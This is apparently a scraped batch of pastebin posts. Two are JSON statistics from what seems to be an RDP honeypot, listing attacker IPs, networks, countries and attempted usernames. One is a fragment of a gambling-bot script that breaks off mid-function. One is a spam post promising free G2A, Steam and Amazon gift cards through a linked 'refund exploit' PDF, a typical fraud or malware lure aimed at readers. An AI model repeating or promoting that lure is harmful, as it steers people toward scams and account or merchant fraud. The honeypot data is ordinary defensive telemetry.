id,title,username,language,date,content
4hvGfscP,2024-05-26_stats.json,rdp_snitch,JSON,Sunday 26th of May 2024 07:16:13 PM CDT,"{
  ""ip"": {
    ""51.68.199.76"": 74,
    ""135.148.145.188"": 148,
    ""184.70.84.114"": 48,
    ""196.92.1.191"": 232,
    ""200.37.0.238"": 88,
    ""196.70.249.123"": 332,
    ""134.195.208.44"": 124,
    ""38.170.237.45"": 162,
    ""104.218.165.34"": 44,
    ""89.165.2.25"": 130,
    ""93.159.194.33"": 126,
    ""139.99.194.253"": 56,
    ""51.81.101.219"": 70,
    ""45.5.94.6"": 188,
    ""80.13.106.84"": 68,
    ""80.153.67.94"": 130,
    ""54.37.51.226"": 84,
    ""177.222.109.58"": 116,
    ""136.24.37.18"": 490,
    ""72.167.34.126"": 84,
    ""61.66.110.143"": 118,
    ""57.128.195.167"": 76,
    ""186.67.171.6"": 142,
    ""107.172.73.131"": 96,
    ""12.226.206.131"": 272,
    ""196.92.1.190"": 224,
    ""95.136.11.137"": 140,
    ""71.167.89.124"": 238,
    ""43.132.186.70"": 64,
    ""15.235.187.94"": 72,
    ""43.153.99.114"": 66,
    ""51.38.161.248"": 56,
    ""135.148.145.186"": 138,
    ""103.195.31.188"": 104,
    ""12.193.127.18"": 196,
    ""103.130.212.203"": 138,
    ""95.92.172.88"": 280,
    ""192.210.149.190"": 102,
    ""176.153.15.140"": 82,
    ""80.14.17.35"": 78,
    ""149.202.172.186"": 90,
    ""194.165.16.76"": 4,
    ""154.85.49.240"": 166,
    ""41.248.10.119"": 2,
    ""80.15.116.13"": 76,
    ""104.218.165.55"": 36,
    ""123.58.207.87"": 60,
    ""193.112.134.231"": 40,
    ""23.94.167.52"": 70,
    ""165.154.174.124"": 72,
    ""189.50.40.204"": 152,
    ""196.206.203.102"": 8,
    ""91.192.221.234"": 80,
    ""100.4.180.56"": 110,
    ""98.142.244.243"": 108,
    ""202.134.162.131"": 64,
    ""80.124.119.50"": 202,
    ""196.206.62.154"": 2,
    ""201.212.3.108"": 66,
    ""135.148.145.189"": 38,
    ""197.216.3.130"": 24,
    ""38.170.237.41"": 42,
    ""196.206.58.132"": 2,
    ""193.112.251.135"": 52,
    ""196.206.53.123"": 2,
    ""196.217.116.186"": 6,
    ""160.179.254.195"": 2,
    ""41.248.11.134"": 4,
    ""196.206.161.104"": 6,
    ""196.206.136.17"": 8,
    ""183.82.117.93"": 2,
    ""45.125.12.148"": 6,
    ""205.210.31.237"": 6,
    ""87.251.75.145"": 8,
    ""116.140.196.215"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 4,
    ""175.209.34.129"": 2,
    ""66.85.52.112"": 4,
    ""165.154.182.207"": 2,
    ""117.16.46.253"": 4,
    ""103.120.19.19"": 16,
    ""36.91.222.100"": 4,
    ""80.66.88.35"": 4,
    ""87.251.75.179"": 4,
    ""45.227.254.54"": 4,
    ""205.210.31.223"": 6,
    ""194.165.16.78"": 4,
    ""64.124.50.139"": 2,
    ""212.70.149.142"": 4,
    ""185.198.69.12"": 14,
    ""194.165.16.37"": 8,
    ""172.232.234.196"": 72,
    ""194.163.155.225"": 12,
    ""179.60.147.144"": 2,
    ""128.199.141.142"": 10,
    ""185.198.74.184"": 6,
    ""205.210.31.129"": 6,
    ""187.157.89.218"": 2,
    ""87.251.75.64"": 2,
    ""112.4.139.162"": 2,
    ""152.42.249.196"": 14,
    ""190.85.232.116"": 2,
    ""80.66.76.130"": 2,
    ""103.109.180.112"": 4,
    ""198.235.24.66"": 6
  },
  ""asn"": {
    ""AS16276"": 902,
    ""AS6327"": 48,
    ""AS6713"": 796,
    ""AS6147"": 88,
    ""AS35916"": 124,
    ""AS48635"": 204,
    ""AS135377"": 214,
    ""AS39501"": 130,
    ""AS196838"": 126,
    ""AS28419"": 188,
    ""AS3215"": 222,
    ""AS3320"": 130,
    ""AS27882"": 116,
    ""AS19165"": 490,
    ""AS398101"": 84,
    ""AS4780"": 118,
    ""AS27651"": 142,
    ""AS36352"": 268,
    ""AS7018"": 468,
    ""AS12353"": 140,
    ""AS701"": 348,
    ""AS132203"": 130,
    ""AS134612"": 104,
    ""AS135953"": 138,
    ""AS2860"": 280,
    ""AS5410"": 82,
    ""AS48721"": 16,
    ""AS55967"": 166,
    ""AS45090"": 92,
    ""AS28326"": 152,
    ""AS36903"": 34,
    ""AS39783"": 80,
    ""AS215415"": 108,
    ""AS132296"": 64,
    ""AS15557"": 202,
    ""AS7303"": 66,
    ""AS11259"": 24,
    ""AS18209"": 2,
    ""AS55933"": 6,
    ""AS396982"": 24,
    ""AS208091"": 24,
    ""AS4837"": 2,
    ""AS197414"": 4,
    ""AS4766"": 2,
    ""AS62537"": 4,
    ""AS18031"": 4,
    ""AS131939"": 16,
    ""AS7713"": 4,
    ""AS267784"": 4,
    ""AS6461"": 2,
    ""AS204428"": 4,
    ""AS57523"": 14,
    ""AS63949"": 72,
    ""AS51167"": 12,
    ""AS209588"": 2,
    ""AS14061"": 24,
    ""AS43260"": 6,
    ""AS8151"": 2,
    ""AS56046"": 2,
    ""AS14080"": 2,
    ""AS133676"": 4
  },
  ""isp"": {
    ""OVH SAS"": 832,
    ""Shaw Communications Inc."": 48,
    ""Itissalat Al-MAGHRIB"": 456,
    ""Telefonica del Peru S.A.A."": 88,
    ""ADSL Maroc telecom"": 338,
    ""Spectero"": 124,
    ""Cldin B.V."": 204,
    ""Zenlayer Inc"": 80,
    ""NGS-DC"": 130,
    ""TRING"": 126,
    ""OVH US LLC"": 70,
    ""Se\u00f1al Interactiva, S.A De C.V"": 188,
    ""France Telecom"": 146,
    ""Deutsche Telekom AG"": 130,
    ""Telef\u00f3nica Celular de Bolivia S.A."": 116,
    ""Webpass Inc."": 490,
    ""GoDaddy.com, LLC"": 84,
    ""NCICNET"": 118,
    ""Entel Chile S.A."": 142,
    ""HostPapa"": 268,
    ""AT&T Services, Inc."": 468,
    ""Vodafone Portugal"": 140,
    ""Verizon Business"": 238,
    ""Aceville Pte.ltd"": 64,
    ""Shenzhen Tencent Computer Systems Company Limited"": 158,
    ""PT Atria Teknologi Indonesia"": 104,
    ""P815"": 138,
    ""NOS COMUNICACOES S.A"": 280,
    ""BOUYGUES Telecom"": 82,
    ""Flyservers S.A."": 22,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 166,
    ""France Telecom Orange"": 76,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 134,
    ""Total Telecom LTDA-ME"": 152,
    ""IP ADSL MarocTelecom"": 34,
    ""Webhuset"": 80,
    ""Verizon Communications"": 110,
    ""Velcom"": 108,
    ""Seven Star Digital Network Private Limited"": 64,
    ""Societe Francaise Du Radiotelephone - SFR SA"": 202,
    ""Telecom Argentina S.A."": 66,
    ""Angola Telecom"": 24,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""Cloudie Limited"": 6,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 24,
    ""China Unicom CHINA169 Network"": 2,
    ""Korea Telecom"": 2,
    ""Sauce Labs Inc"": 4,
    ""Sangmyung University"": 4,
    ""IPS INC"": 16,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Xhost Internet Solutions"": 4,
    ""Zayo Bandwidth"": 2,
    ""SS-Net"": 4,
    ""Chang Way Technologies Co. Limited"": 14,
    ""Akamai Technologies, Inc."": 72,
    ""Contabo GmbH"": 12,
    ""DigitalOcean, LLC"": 24,
    ""DGN TEKNOLOJI A.S."": 6,
    ""Uninet S.A. de C.V."": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Telmex Colombia S.A."": 2,
    ""Gstech Software Systems Pvt Ltd"": 4
  },
  ""org"": {
    ""OVH Ltd"": 74,
    ""OVH US LLC"": 324,
    ""Shaw Communications Inc"": 48,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 456,
    ""UniRed Red Interna"": 88,
    ""Unknown"": 1546,
    ""CloudCone, LLC"": 124,
    ""ServerMania Inc"": 204,
    ""UCLOUD"": 80,
    ""Neda Gostar Saba Data Transfer Company"": 130,
    ""OVH Australia PTY LTD"": 56,
    ""LEVEL7BR.COM, OTAVIO HENRIQUE"": 70,
    ""Se\u00f1al Interactiva, S.A De C.V"": 188,
    ""Deutsche Telekom AG"": 130,
    ""chen zexin"": 84,
    ""Telef\u00f3nica Celular de Bolivia S.A"": 116,
    ""Webpass Inc"": 490,
    ""GoDaddy.com, LLC"": 84,
    ""New Centry InfoComm Tech. Co., Ltd."": 118,
    ""OVH Sp. z o. o"": 76,
    ""Entel Chile S.A"": 142,
    ""ColoCrossing"": 198,
    ""ATT SERVICES INC - PEGACM-MD"": 272,
    ""Vodafone Portugal - Communicacoes Pessoais S.A."": 140,
    ""Verizon Business"": 238,
    ""OVH Singapore PTE. LTD"": 72,
    ""Tencent Cloud Computing"": 66,
    ""Kota Komputer Wendy"": 56,
    ""ATT SERVICES INC- PEG"": 196,
    ""NOS Comunicacoes S.A."": 280,
    ""OVH"": 90,
    ""Flyservers S.A"": 16,
    ""Ucloud Information Technology (hk) Limited"": 60,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 92,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 72,
    ""Total Telecom Ltda"": 152,
    ""Webhuset"": 80,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 110,
    ""Ipxo LLC"": 108,
    ""7 STAR Dot Com Pvt. Ltd"": 64,
    ""Telecom Argentina S.A"": 66,
    ""AngolaTelecomPublic"": 24,
    ""MarocTelecomASDL"": 2,
    ""Beam Telecom Pvt Ltd"": 2,
    ""Cloudie Limited"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 20,
    ""China United Network Communications Corporation Limited"": 2,
    ""Xhostis"": 4,
    ""Kornet"": 2,
    ""Sauce Labs Inc"": 4,
    ""Ucloud Information Technology"": 2,
    ""Korean Education Network"": 4,
    ""IPS Inc"": 16,
    ""Telekomunikasi Indonesia"": 4,
    ""XHOSTIS"": 4,
    ""UAB Host Baltic"": 4,
    ""Microsoft Corporation"": 2,
    ""4Media Ltd"": 4,
    ""Chang Way Technologies Co. Limited"": 14,
    ""Akamai Technologies, Inc."": 72,
    ""Contabo"": 12,
    ""Cloud Solutions S.A"": 2,
    ""DigitalOcean, LLC"": 24,
    ""Makdos Bilisim Teknolojileri Sanayi Ticaret Limited Sirketi"": 6,
    ""Uninet S.A. de C.V."": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Telmex Colombia S.A"": 2,
    ""Gstech Software Systems Pvt Ltd"": 4
  },
  ""regionName"": {
    ""England"": 286,
    ""Virginia"": 324,
    ""Alberta"": 48,
    ""Casablanca-Settat"": 824,
    ""Lima Province"": 88,
    ""California"": 1250,
    ""North Holland"": 336,
    ""Tehran"": 130,
    ""Durr\u00ebs County"": 126,
    ""New South Wales"": 56,
    ""West Virginia"": 70,
    ""Coahuila"": 188,
    ""\u00cele-de-France"": 424,
    ""Saxony"": 130,
    ""Hauts-de-France"": 230,
    ""Santa Cruz Department"": 116,
    ""Arizona"": 84,
    ""Taipei"": 118,
    ""Mazovia"": 76,
    ""Santiago Metropolitan"": 142,
    ""New York"": 514,
    ""Lisbon"": 420,
    ""Central and Western District"": 64,
    ""Central Singapore"": 72,
    ""Jakarta"": 180,
    ""Texas"": 196,
    ""Hanoi"": 138,
    ""Auvergne-Rh\u00f4ne-Alpes"": 82,
    ""Kaunas"": 16,
    ""Guangdong"": 92,
    ""Goi\u00e1s"": 152,
    ""Oslo County"": 80,
    ""Maharashtra"": 64,
    ""Buenos Aires F.D."": 66,
    ""Luanda Province"": 24,
    ""Souss-Massa"": 6,
    ""Telangana"": 2,
    ""Yau Tsim Mong"": 6,
    ""Beijing"": 2,
    ""Seoul"": 6,
    ""Tokyo"": 16,
    ""Drenthe"": 4,
    ""Vilnius"": 4,
    ""Washington"": 2,
    ""Plovdiv"": 4,
    ""Moscow"": 14,
    ""North Rhine-Westphalia"": 12,
    ""Distrito Federal"": 2,
    ""South West"": 24,
    ""Istanbul"": 6,
    ""Mexico City"": 2,
    ""Jiangsu"": 2,
    ""Bogota D.C."": 2,
    ""Uttar Pradesh"": 4
  },
  ""country"": {
    ""United Kingdom"": 286,
    ""United States"": 2440,
    ""Canada"": 48,
    ""Morocco"": 830,
    ""Peru"": 88,
    ""Netherlands"": 204,
    ""Iran"": 130,
    ""Albania"": 126,
    ""Australia"": 56,
    ""Mexico"": 190,
    ""France"": 736,
    ""Germany"": 142,
    ""Bolivia"": 116,
    ""Taiwan"": 118,
    ""Poland"": 76,
    ""Chile"": 142,
    ""Portugal"": 420,
    ""Hong Kong"": 70,
    ""Singapore"": 96,
    ""Indonesia"": 180,
    ""Vietnam"": 138,
    ""Lithuania"": 20,
    ""China"": 96,
    ""Brazil"": 152,
    ""Norway"": 80,
    ""The Netherlands"": 136,
    ""India"": 70,
    ""Argentina"": 66,
    ""Angola"": 24,
    ""South Korea"": 6,
    ""Japan"": 16,
    ""Bulgaria"": 4,
    ""Russia"": 14,
    ""Venezuela"": 2,
    ""T\u00fcrkiye"": 6,
    ""Colombia"": 2
  },
  ""account"": {
    ""142.93.8.59"": 7066,
    ""Test"": 30,
    ""(empty)"": 10,
    ""hello"": 74,
    ""RkWCwwjjD"": 2,
    ""VJjaVl"": 2,
    ""HDXiLC"": 2,
    ""Administr"": 48,
    ""Administrator"": 20,
    ""YQTbrKhUt"": 2,
    ""FpoHiI"": 2,
    ""HIFhnN"": 2,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""Jakartakini123#"": 18,
    ""ssgcrRNrL"": 2,
    ""XqyMRB"": 2,
    ""eeuhMt"": 2,
    ""gDSvVUKCW"": 2,
    ""wmMNEB"": 2,
    ""Rkvpgg"": 2
  },
  ""keyboard"": {
    ""Unknown"": 7326
  },
  ""client_build"": {
    ""Unknown"": 7326
  },
  ""client_name"": {
    ""Unknown"": 7326
  },
  ""ip_type"": {
    ""hosting"": 2166,
    ""Unknown"": 4814,
    ""hosting & proxy"": 204,
    ""mobile"": 120,
    ""proxy"": 22
  }
}"
yVRQQJx9,ü§ë G2A.com Free Gift Card Guide May 2024 FIX ü§ë,jusst2k4,GetText,Sunday 26th of May 2024 07:15:12 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_757886.pdf

Working as of:
27 May 2024"
XcVdXGMe,2024-05-26_stats.json,rdp_snitch,JSON,Sunday 26th of May 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""51.68.199.76"": 37,
    ""135.148.145.188"": 74,
    ""184.70.84.114"": 24,
    ""196.92.1.191"": 116,
    ""200.37.0.238"": 44,
    ""196.70.249.123"": 166,
    ""134.195.208.44"": 62,
    ""38.170.237.45"": 81,
    ""104.218.165.34"": 22,
    ""89.165.2.25"": 65,
    ""93.159.194.33"": 63,
    ""139.99.194.253"": 28,
    ""51.81.101.219"": 35,
    ""45.5.94.6"": 94,
    ""80.13.106.84"": 34,
    ""80.153.67.94"": 65,
    ""54.37.51.226"": 42,
    ""177.222.109.58"": 58,
    ""136.24.37.18"": 245,
    ""72.167.34.126"": 42,
    ""61.66.110.143"": 59,
    ""57.128.195.167"": 38,
    ""186.67.171.6"": 71,
    ""107.172.73.131"": 48,
    ""12.226.206.131"": 136,
    ""196.92.1.190"": 112,
    ""95.136.11.137"": 70,
    ""71.167.89.124"": 119,
    ""43.132.186.70"": 32,
    ""15.235.187.94"": 36,
    ""43.153.99.114"": 33,
    ""51.38.161.248"": 28,
    ""135.148.145.186"": 69,
    ""103.195.31.188"": 52,
    ""12.193.127.18"": 98,
    ""103.130.212.203"": 69,
    ""95.92.172.88"": 140,
    ""192.210.149.190"": 51,
    ""176.153.15.140"": 41,
    ""80.14.17.35"": 39,
    ""149.202.172.186"": 45,
    ""194.165.16.76"": 2,
    ""154.85.49.240"": 83,
    ""41.248.10.119"": 1,
    ""80.15.116.13"": 38,
    ""104.218.165.55"": 18,
    ""123.58.207.87"": 30,
    ""193.112.134.231"": 20,
    ""23.94.167.52"": 35,
    ""165.154.174.124"": 36,
    ""189.50.40.204"": 76,
    ""196.206.203.102"": 4,
    ""91.192.221.234"": 40,
    ""100.4.180.56"": 55,
    ""98.142.244.243"": 54,
    ""202.134.162.131"": 32,
    ""80.124.119.50"": 101,
    ""196.206.62.154"": 1,
    ""201.212.3.108"": 33,
    ""135.148.145.189"": 19,
    ""197.216.3.130"": 12,
    ""38.170.237.41"": 21,
    ""196.206.58.132"": 1,
    ""193.112.251.135"": 26,
    ""196.206.53.123"": 1,
    ""196.217.116.186"": 3,
    ""160.179.254.195"": 1,
    ""41.248.11.134"": 2,
    ""196.206.161.104"": 3,
    ""196.206.136.17"": 4,
    ""183.82.117.93"": 1,
    ""45.125.12.148"": 3,
    ""205.210.31.237"": 3,
    ""87.251.75.145"": 4,
    ""116.140.196.215"": 1,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 2,
    ""175.209.34.129"": 1,
    ""66.85.52.112"": 2,
    ""165.154.182.207"": 1,
    ""117.16.46.253"": 2,
    ""103.120.19.19"": 8,
    ""36.91.222.100"": 2,
    ""80.66.88.35"": 2,
    ""87.251.75.179"": 2,
    ""45.227.254.54"": 2,
    ""205.210.31.223"": 3,
    ""194.165.16.78"": 2,
    ""64.124.50.139"": 1,
    ""212.70.149.142"": 2,
    ""185.198.69.12"": 7,
    ""194.165.16.37"": 4,
    ""172.232.234.196"": 36,
    ""194.163.155.225"": 6,
    ""179.60.147.144"": 1,
    ""128.199.141.142"": 5,
    ""185.198.74.184"": 3,
    ""205.210.31.129"": 3,
    ""187.157.89.218"": 1,
    ""87.251.75.64"": 1,
    ""112.4.139.162"": 1,
    ""152.42.249.196"": 7,
    ""190.85.232.116"": 1,
    ""80.66.76.130"": 1,
    ""103.109.180.112"": 2,
    ""198.235.24.66"": 3
  },
  ""asn"": {
    ""AS16276"": 451,
    ""AS6327"": 24,
    ""AS6713"": 398,
    ""AS6147"": 44,
    ""AS35916"": 62,
    ""AS48635"": 102,
    ""AS135377"": 107,
    ""AS39501"": 65,
    ""AS196838"": 63,
    ""AS28419"": 94,
    ""AS3215"": 111,
    ""AS3320"": 65,
    ""AS27882"": 58,
    ""AS19165"": 245,
    ""AS398101"": 42,
    ""AS4780"": 59,
    ""AS27651"": 71,
    ""AS36352"": 134,
    ""AS7018"": 234,
    ""AS12353"": 70,
    ""AS701"": 174,
    ""AS132203"": 65,
    ""AS134612"": 52,
    ""AS135953"": 69,
    ""AS2860"": 140,
    ""AS5410"": 41,
    ""AS48721"": 8,
    ""AS55967"": 83,
    ""AS45090"": 46,
    ""AS28326"": 76,
    ""AS36903"": 17,
    ""AS39783"": 40,
    ""AS215415"": 54,
    ""AS132296"": 32,
    ""AS15557"": 101,
    ""AS7303"": 33,
    ""AS11259"": 12,
    ""AS18209"": 1,
    ""AS55933"": 3,
    ""AS396982"": 12,
    ""AS208091"": 12,
    ""AS4837"": 1,
    ""AS197414"": 2,
    ""AS4766"": 1,
    ""AS62537"": 2,
    ""AS18031"": 2,
    ""AS131939"": 8,
    ""AS7713"": 2,
    ""AS267784"": 2,
    ""AS6461"": 1,
    ""AS204428"": 2,
    ""AS57523"": 7,
    ""AS63949"": 36,
    ""AS51167"": 6,
    ""AS209588"": 1,
    ""AS14061"": 12,
    ""AS43260"": 3,
    ""AS8151"": 1,
    ""AS56046"": 1,
    ""AS14080"": 1,
    ""AS133676"": 2
  },
  ""isp"": {
    ""OVH SAS"": 416,
    ""Shaw Communications Inc."": 24,
    ""Itissalat Al-MAGHRIB"": 228,
    ""Telefonica del Peru S.A.A."": 44,
    ""ADSL Maroc telecom"": 169,
    ""Spectero"": 62,
    ""Cldin B.V."": 102,
    ""Zenlayer Inc"": 40,
    ""NGS-DC"": 65,
    ""TRING"": 63,
    ""OVH US LLC"": 35,
    ""Se\u00f1al Interactiva, S.A De C.V"": 94,
    ""France Telecom"": 73,
    ""Deutsche Telekom AG"": 65,
    ""Telef\u00f3nica Celular de Bolivia S.A."": 58,
    ""Webpass Inc."": 245,
    ""GoDaddy.com, LLC"": 42,
    ""NCICNET"": 59,
    ""Entel Chile S.A."": 71,
    ""HostPapa"": 134,
    ""AT&T Services, Inc."": 234,
    ""Vodafone Portugal"": 70,
    ""Verizon Business"": 119,
    ""Aceville Pte.ltd"": 32,
    ""Shenzhen Tencent Computer Systems Company Limited"": 79,
    ""PT Atria Teknologi Indonesia"": 52,
    ""P815"": 69,
    ""NOS COMUNICACOES S.A"": 140,
    ""BOUYGUES Telecom"": 41,
    ""Flyservers S.A."": 11,
    ""Beijing Baidu Netcom Science and Technology Co., Ltd."": 83,
    ""France Telecom Orange"": 38,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 67,
    ""Total Telecom LTDA-ME"": 76,
    ""IP ADSL MarocTelecom"": 17,
    ""Webhuset"": 40,
    ""Verizon Communications"": 55,
    ""Velcom"": 54,
    ""Seven Star Digital Network Private Limited"": 32,
    ""Societe Francaise Du Radiotelephone - SFR SA"": 101,
    ""Telecom Argentina S.A."": 33,
    ""Angola Telecom"": 12,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""Cloudie Limited"": 3,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 12,
    ""China Unicom CHINA169 Network"": 1,
    ""Korea Telecom"": 1,
    ""Sauce Labs Inc"": 2,
    ""Sangmyung University"": 2,
    ""IPS INC"": 8,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Xhost Internet Solutions"": 2,
    ""Zayo Bandwidth"": 1,
    ""SS-Net"": 2,
    ""Chang Way Technologies Co. Limited"": 7,
    ""Akamai Technologies, Inc."": 36,
    ""Contabo GmbH"": 6,
    ""DigitalOcean, LLC"": 12,
    ""DGN TEKNOLOJI A.S."": 3,
    ""Uninet S.A. de C.V."": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Telmex Colombia S.A."": 1,
    ""Gstech Software Systems Pvt Ltd"": 2
  },
  ""org"": {
    ""OVH Ltd"": 37,
    ""OVH US LLC"": 162,
    ""Shaw Communications Inc"": 24,
    ""Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM"": 228,
    ""UniRed Red Interna"": 44,
    ""Unknown"": 773,
    ""CloudCone, LLC"": 62,
    ""ServerMania Inc"": 102,
    ""UCLOUD"": 40,
    ""Neda Gostar Saba Data Transfer Company"": 65,
    ""OVH Australia PTY LTD"": 28,
    ""LEVEL7BR.COM, OTAVIO HENRIQUE"": 35,
    ""Se\u00f1al Interactiva, S.A De C.V"": 94,
    ""Deutsche Telekom AG"": 65,
    ""chen zexin"": 42,
    ""Telef\u00f3nica Celular de Bolivia S.A"": 58,
    ""Webpass Inc"": 245,
    ""GoDaddy.com, LLC"": 42,
    ""New Centry InfoComm Tech. Co., Ltd."": 59,
    ""OVH Sp. z o. o"": 38,
    ""Entel Chile S.A"": 71,
    ""ColoCrossing"": 99,
    ""ATT SERVICES INC - PEGACM-MD"": 136,
    ""Vodafone Portugal - Communicacoes Pessoais S.A."": 70,
    ""Verizon Business"": 119,
    ""OVH Singapore PTE. LTD"": 36,
    ""Tencent Cloud Computing"": 33,
    ""Kota Komputer Wendy"": 28,
    ""ATT SERVICES INC- PEG"": 98,
    ""NOS Comunicacoes S.A."": 140,
    ""OVH"": 45,
    ""Flyservers S.A"": 8,
    ""Ucloud Information Technology (hk) Limited"": 30,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 46,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 36,
    ""Total Telecom Ltda"": 76,
    ""Webhuset"": 40,
    ""MCI Communications Services, Inc. d/b/a Verizon Business"": 55,
    ""Ipxo LLC"": 54,
    ""7 STAR Dot Com Pvt. Ltd"": 32,
    ""Telecom Argentina S.A"": 33,
    ""AngolaTelecomPublic"": 12,
    ""MarocTelecomASDL"": 1,
    ""Beam Telecom Pvt Ltd"": 1,
    ""Cloudie Limited"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 10,
    ""China United Network Communications Corporation Limited"": 1,
    ""Xhostis"": 2,
    ""Kornet"": 1,
    ""Sauce Labs Inc"": 2,
    ""Ucloud Information Technology"": 1,
    ""Korean Education Network"": 2,
    ""IPS Inc"": 8,
    ""Telekomunikasi Indonesia"": 2,
    ""XHOSTIS"": 2,
    ""UAB Host Baltic"": 2,
    ""Microsoft Corporation"": 1,
    ""4Media Ltd"": 2,
    ""Chang Way Technologies Co. Limited"": 7,
    ""Akamai Technologies, Inc."": 36,
    ""Contabo"": 6,
    ""Cloud Solutions S.A"": 1,
    ""DigitalOcean, LLC"": 12,
    ""Makdos Bilisim Teknolojileri Sanayi Ticaret Limited Sirketi"": 3,
    ""Uninet S.A. de C.V."": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Telmex Colombia S.A"": 1,
    ""Gstech Software Systems Pvt Ltd"": 2
  },
  ""regionName"": {
    ""England"": 143,
    ""Virginia"": 162,
    ""Alberta"": 24,
    ""Casablanca-Settat"": 412,
    ""Lima Province"": 44,
    ""California"": 625,
    ""North Holland"": 168,
    ""Tehran"": 65,
    ""Durr\u00ebs County"": 63,
    ""New South Wales"": 28,
    ""West Virginia"": 35,
    ""Coahuila"": 94,
    ""\u00cele-de-France"": 212,
    ""Saxony"": 65,
    ""Hauts-de-France"": 115,
    ""Santa Cruz Department"": 58,
    ""Arizona"": 42,
    ""Taipei"": 59,
    ""Mazovia"": 38,
    ""Santiago Metropolitan"": 71,
    ""New York"": 257,
    ""Lisbon"": 210,
    ""Central and Western District"": 32,
    ""Central Singapore"": 36,
    ""Jakarta"": 90,
    ""Texas"": 98,
    ""Hanoi"": 69,
    ""Auvergne-Rh\u00f4ne-Alpes"": 41,
    ""Kaunas"": 8,
    ""Guangdong"": 46,
    ""Goi\u00e1s"": 76,
    ""Oslo County"": 40,
    ""Maharashtra"": 32,
    ""Buenos Aires F.D."": 33,
    ""Luanda Province"": 12,
    ""Souss-Massa"": 3,
    ""Telangana"": 1,
    ""Yau Tsim Mong"": 3,
    ""Beijing"": 1,
    ""Seoul"": 3,
    ""Tokyo"": 8,
    ""Drenthe"": 2,
    ""Vilnius"": 2,
    ""Washington"": 1,
    ""Plovdiv"": 2,
    ""Moscow"": 7,
    ""North Rhine-Westphalia"": 6,
    ""Distrito Federal"": 1,
    ""South West"": 12,
    ""Istanbul"": 3,
    ""Mexico City"": 1,
    ""Jiangsu"": 1,
    ""Bogota D.C."": 1,
    ""Uttar Pradesh"": 2
  },
  ""country"": {
    ""United Kingdom"": 143,
    ""United States"": 1220,
    ""Canada"": 24,
    ""Morocco"": 415,
    ""Peru"": 44,
    ""Netherlands"": 102,
    ""Iran"": 65,
    ""Albania"": 63,
    ""Australia"": 28,
    ""Mexico"": 95,
    ""France"": 368,
    ""Germany"": 71,
    ""Bolivia"": 58,
    ""Taiwan"": 59,
    ""Poland"": 38,
    ""Chile"": 71,
    ""Portugal"": 210,
    ""Hong Kong"": 35,
    ""Singapore"": 48,
    ""Indonesia"": 90,
    ""Vietnam"": 69,
    ""Lithuania"": 10,
    ""China"": 48,
    ""Brazil"": 76,
    ""Norway"": 40,
    ""The Netherlands"": 68,
    ""India"": 35,
    ""Argentina"": 33,
    ""Angola"": 12,
    ""South Korea"": 3,
    ""Japan"": 8,
    ""Bulgaria"": 2,
    ""Russia"": 7,
    ""Venezuela"": 1,
    ""T\u00fcrkiye"": 3,
    ""Colombia"": 1
  },
  ""account"": {
    ""142.93.8.59"": 3533,
    ""Test"": 15,
    ""(empty)"": 5,
    ""hello"": 37,
    ""RkWCwwjjD"": 1,
    ""VJjaVl"": 1,
    ""HDXiLC"": 1,
    ""Administr"": 24,
    ""Administrator"": 10,
    ""YQTbrKhUt"": 1,
    ""FpoHiI"": 1,
    ""HIFhnN"": 1,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""Jakartakini123#"": 9,
    ""ssgcrRNrL"": 1,
    ""XqyMRB"": 1,
    ""eeuhMt"": 1,
    ""gDSvVUKCW"": 1,
    ""wmMNEB"": 1,
    ""Rkvpgg"": 1
  },
  ""keyboard"": {
    ""Unknown"": 3663
  },
  ""client_build"": {
    ""Unknown"": 3663
  },
  ""client_name"": {
    ""Unknown"": 3663
  },
  ""ip_type"": {
    ""hosting"": 1083,
    ""Unknown"": 2407,
    ""hosting & proxy"": 102,
    ""mobile"": 60,
    ""proxy"": 11
  }
}"
qsAjHZB4,snowybot jd update,coinwalk,JavaScript,Sunday 26th of May 2024 07:14:58 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/1000).toFixed(8));
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = 144000;
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = ((Math.floor(elderly/tens))*tens);
var nomnom = true;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
